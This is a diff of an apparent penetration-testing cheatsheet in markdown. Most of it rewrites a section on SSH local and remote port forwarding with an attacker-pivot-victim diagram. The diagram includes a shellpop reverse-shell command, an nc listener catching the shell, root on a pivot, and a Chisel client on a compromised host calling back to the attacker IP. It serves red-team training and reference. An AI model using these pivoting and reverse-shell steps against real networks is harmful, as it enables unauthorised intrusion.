@@ -1,6 +1,6 @@
 ﻿[![main-page](https://img.shields.io/badge/Back%20to%20the%20main%20page-snovvcrash.github.io-cc0000?style=for-the-badge&logo=jekyll&logoColor=cc0000)](https://snovvcrash.github.io/)
 
-Use your <kbd>Ctrl</kbd>-<kbd>F</kbd> to navigate this mess ☣️
+Use your <kbd>Ctrl</kbd>-<kbd>F</kbd> to navigate this mess.
 
 [//]: # (# -- 5 spaces)
 [//]: # (## -- 4 spaces)
@@ -2216,32 +2216,23 @@ $ nc -nv 10.10.13.37 4444 [-C]
 
 `parsenmap.rb`:
 
+* [https://github.com/R3dy/parsenmap](https://github.com/R3dy/parsenmap)
+
 ```
 $ git clone https://github.com/R3dy/parsenmap-rb ~/tools/parsenmap-rb && cd ~/tools/parsenmap-rb
 $ bundle install && ln -s ~/tools/parsenmap-rb/parsenmap.rb /usr/local/bin/parsenmap.rb && cd -
 $ parsenmap.rb --help
 ```
 
-* [https://github.com/R3dy/parsenmap](https://github.com/R3dy/parsenmap)
-
 `nmaptocsv`:
+
+* [https://github.com/maaaaz/nmaptocsv](https://github.com/maaaaz/nmaptocsv)
 
 ```
 $ git clone https://github.com/maaaaz/nmaptocsv ~/tools/nmaptocsv && cd ~/tools/nmaptocsv
 $ python3 -m pip install -r requirements.txt csvkit && ln -s ~/tools/nmaptocsv/nmaptocsv.py /usr/local/bin/nmaptocsv.py && cd -
 $ nmaptocsv.py --help
 ```
-
-* [https://github.com/maaaaz/nmaptocsv](https://github.com/maaaaz/nmaptocsv)
-
-`parsenmap.py`:
-
-```
-$ wget https://github.com/snovvcrash/cheatsheets/raw/master/tools/parsenmap.py -O ~/tools/parsenmap-py/parsenmap.py && chmod +x ~/tools/parsenmap-py/parsenmap.py
-$ ln -s ~/tools/parsenmap-py/parsenmap.py /usr/local/bin/parsenmap.py
-```
-
-* [https://github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py)
 
 
 
@@ -3197,8 +3188,6 @@ PS > [System.Diagnostics.FileVersionInfo]::GetVersionInfo($(Get-Item .\clr.dll))
 
 
 ### Base64
-
-* [https://github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py)
 
 Local file to base64:
 
@@ -4960,43 +4949,71 @@ Stager encryption is the same as for Ruler/Forms.
 
 * [https://habr.com/ru/post/331348/#t2](https://habr.com/ru/post/331348/#t2)
 
-* Attacker's IP: `10.10.13.37`
-* Victims's IP: `192.168.0.20`
 
 
+### Local vs Remote Port Forwarding
 
-### Local vs Remote Port Forwarding Notes
+A cheatsheet for SSH Local/Remote Forwarding command syntax:
 
-Listen port `443` on Victim and forward connections to port `1337` on Attacker. Here the Attacker (SSH client) connects to the Victim (SSH server), so the traffic is forwarded *from SSH server via SSH client* (i.e., **remote** port forwarding):
+* `-L 1111:127.0.0.1:2222`: the traffic is forwarded *from SSH client via SSH server*, so `1111` is listening on client-side and traffic is sent to `2222` on server-side.
+* `-R 2222:127.0.0.1:1111`: the traffic is forwarded *from SSH server via SSH client*, so `2222` is listening on server-side and traffic is sent to `1111` on client-side.
 
-```
-snovvcrash@attacker:~$ ssh -R 443:127.0.0.1:1337 root@192.168.0.20
-root@victim:~# netstat -tulpan | grep 443
-tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      19122/sshd: root@pt
-tcp6       0      0 :::443                  :::*                    LISTEN      19122/sshd: root@pt
-```
-
-Now I can listen port `1337` on Attacker, send a reverse-shell from a third-party host to Victim (`192.168.0.20:443`) and catch it on Attacker (`10.10.13.37:1337`):
+Consider the following example. An attacker has root privileges on Pivot1. He creates the first SSH tunnel (remote port forwarding) to interact with a vulnerable web server on Pivot2. Then he exploits the vulnerability on Pivot2 and triggers it to connect back to Attacker with a reverse-shell (firewall is active, so he needs to pivot through port 443, which is allowed). After that the attacker performs PE on Pivot2 and gets root. Then he creates another tunnel (local port forwarding) over the first one to SSH into Pivot2 from Attacker. Finally, he forwards port 80 over two existing hops to pwn a vulnerable web server on Victim.
 
 ```
-snovvcrash@attacker:~$ rlwrap nc -lvnp 1337
+  Attacker (10.10.13.37)                                                    Pivot1 (10.1.1.1)                                  Pivot2 (10.2.2.2)                   Victim (10.3.3.3)
+┌──────────────────────────────────────────────────────────────────────┐  ┌───────────────────────────────────────────────┐  ┌────────────────────────────────┐  ┌───────────────────┐
+│                                                                   22 │  │                                               │  │                                │  │                   │
+│ 1.  ssh -R 443:127.0.0.1:9001 root@10.1.1.1 ------------------------------► 10.1.1.1:22                                 │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 2.                                                                   │  │   Listens 0.0.0.0:443 ("GatewayPorts yes")    │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 3.                                                                   │  │   ~C ssh> -L 9002:10.2.2.2:80                 │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 4.  Listens 127.0.0.1:9002 (to interact with web server 10.2.2.2:80) │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 5.  shellpop -H 10.2.2.2 -P 443 --reverse --number 8 --base64        │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                9001 over 10.1.1.1:22 │  │                                           443 │  │                                │  │                   │
+│ 6.  rlwrap nc -lvnp 9001 ◄--- 127.0.0.1:9001 ◄----------------------------- 0.0.0.0:443 ◄───────────────────────────────┼──┼── Web server 10.2.2.2:80       │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 7.  Got shell from 10.2.2.2                                          │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 8.  Got root on 10.2.2.2                                             │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                                      │  │   ~C ssh> -L 9003:127.0.0.1:1337              │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 9.  Listens 127.0.0.1:9003                                           │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                            22 │  │                                │  │                   │
+│                                                                      │  │   ssh -L 1337:127.0.0.1:22 root@10.2.2.2 ----------► 10.2.2.2:22                  │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                                      │  │   Listens 127.0.0.1:1337                      │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                1337 over 10.1.1.1:22 │  │                           22 over 10.2.2.2:22 │  │                                │  │                   │
+│ 10. ssh root@127.0.0.1 -p 9003 -------------------------------------------► 127.0.0.1:1337 ----------------------------------► 127.0.0.1:22                 │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │   ~C ssh> -L 9004:10.3.3.3:80  │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│ 11. Listens 127.0.0.1:9004                                           │  │                                               │  │                                │  │                   │
+│                                                                      │  │                                               │  │                                │  │                   │
+│                                                1337 over 10.1.1.1:22 │  │                           22 over 10.2.2.2:22 │  │                                │  │                   │
+│ 12. curl http://127.0.0.1:9004/ ------------------------------------------► 127.0.0.1:1337 ----------------------------------► 127.0.0.1:22 ────────────────┼──┼─► 10.3.3.3:80     │
+│                                                                      │  │                                               │  │                                │  │                   │
+└──────────────────────────────────────────────────────────────────────┘  └───────────────────────────────────────────────┘  └────────────────────────────────┘  └───────────────────┘
 ```
 
-For SSH server to listen at `0.0.0.0`, the `GatewayPorts yes` must be set in `sshd_config`:
+Notes:
 
-```
-$ sudo vi /etc/ssh/sshd_config
-$ sudo systemctl restart ssh
-```
-
-With Chisel server running on the Attacker the same can be achieved by doing **local** port forwarding, i.e. the traffic is forwarded *from Chisel (SSH) client via Chisel (SSH) server*:
+* `1.` For SSH server to listen at `0.0.0.0` instead of `127.0.0.1`, the `GatewayPorts yes` must be set in `/etc/ssh/sshd_config`.
+* `1.` With SSH (or Chisel, for example) **server** running on the Attacker the same can be achieved by doing **local** port forwarding instead of **remote**.
 
 ```
 snovvcrash@attacker:~$ ./chisel server -p 8000
-root@victim:~# nohup ./chisel client 10.10.13.37:8000 443:127.0.0.1:1337 &
-root@victim:~# netstat -tulpan | grep 443
+root@pivot1:~# nohup ./chisel client 10.10.13.37:8000 443:127.0.0.1:9001 &
+root@pivot1:~# netstat -tulpan | grep 443
 tcp6       0      0 :::443                 :::*                    LISTEN      18406/./chisel
-snovvcrash@attacker:~$ rlwrap nc -lvnp 1337
+snovvcrash@attacker:~$ rlwrap nc -lvnp 9001
 ```
 
 
